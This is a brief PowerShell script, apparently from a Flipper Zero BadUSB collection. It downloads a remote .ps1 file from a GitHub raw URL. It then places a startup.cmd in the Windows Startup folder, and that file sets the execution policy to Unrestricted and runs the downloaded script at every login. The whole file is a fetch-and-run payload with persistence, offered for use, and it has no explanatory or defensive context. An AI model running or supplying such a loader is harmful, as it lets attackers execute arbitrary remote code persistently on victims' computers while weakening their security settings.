$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/tst.ps1"
Invoke-WebRequest $myDownloadUrl -OutFile "C:/temp/file.ps1"


$autoStartCmd = @"
PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
PowerShell C:\temp\file.ps1 >> "%TEMP%\StartupLog.txt" 2>&1
"@

$autoStartCmd | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd" -Encoding ascii
